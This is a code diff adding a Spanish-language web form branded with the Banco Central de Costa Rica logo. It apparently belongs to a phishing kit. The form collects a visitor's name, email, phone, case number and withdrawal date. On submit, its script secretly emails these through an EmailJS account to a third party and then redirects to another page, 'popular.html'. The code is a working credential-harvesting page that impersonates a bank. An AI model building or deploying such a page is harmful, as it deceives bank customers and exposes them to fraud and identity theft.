@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Trámite</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="../register-login.css">
+</head>
+<body>
+    <header>
+        <nav class="navbar">
+            <div class="nav-logo">
+                <img src="../logo.png" alt="Banco Central de Costa Rica" class="logo">
+            </div>
+        </nav>
+    </header>
+    
+    <main>
+        <div class="container">
+            <section class="auth-section">
+                <div class="form-header">
+                    <h2>Datos para validar trámite</h2>
+                    <p>Complete los siguientes campos para procesar su solicitud</p>
+                </div>
+                
+                <div class="form-container">
+                    <form id="form">
+                        <div class="input-group">
+                            <label for="nombre">Nombre completo</label>
+                            <input type="text" name="nombre" id="name" required>
+                        </div>
+
+                        <div class="input-group">
+                            <label for="email">Correo electrónico</label>
+                            <input type="email" id="email" name="email" required>
+                        </div>
+
+                        <div class="input-group">
+                            <label for="telefono">Teléfono registrado</label>
+                            <input type="tel" id="telefono" name="telefono" required>
+                        </div>
+
+                        <div class="input-group">
+                            <label for="numero_gestion">Número de gestión</label>
+                            <input type="text" id="numero_gestion" name="numero_gestion" required>
+                        </div>
+
+                        <div class="input-group">
+                            <label for="fecha_retiro">Fecha de retiro</label>
+                            <input type="date" id="fecha_retiro" name="fecha_retiro" required>
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="submit" id="button" class="btn-primary">Enviar datos</button>
+                        </div>
+                    </form>
+                </div>
+            </section>
+        </div>
+    </main>
+    
+    <footer>
+        <div class="footer-content">
+            <img src="../logo-firma-digital.png" alt="Centro de Soporte Firma Digital" class="logo-firma">
+        </div>
+    </footer>
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        emailjs.init('Fdk3dIBYptP-7lOoE')
+    </script>
+
+    <script>
+    const btn = document.getElementById('button');
+    const form = document.getElementById('form');
+
+    form.addEventListener('submit', function(event) {
+       event.preventDefault();
+    
+       btn.textContent = 'Enviando...';
+       btn.disabled = true;
+    
+       const serviceID = 'default_service';
+       const templateID = 'template_c6f151o';
+    
+       emailjs.sendForm(serviceID, templateID, this)
+        .then(() => {
+          window.location.href = 'popular.html';
+        }, (err) => {
+          btn.textContent = 'Enviar datos';
+          btn.disabled = false;
+          alert('Error al enviar: ' + JSON.stringify(err));
+        });
+    });
+    </script>
+</body>
+</html>
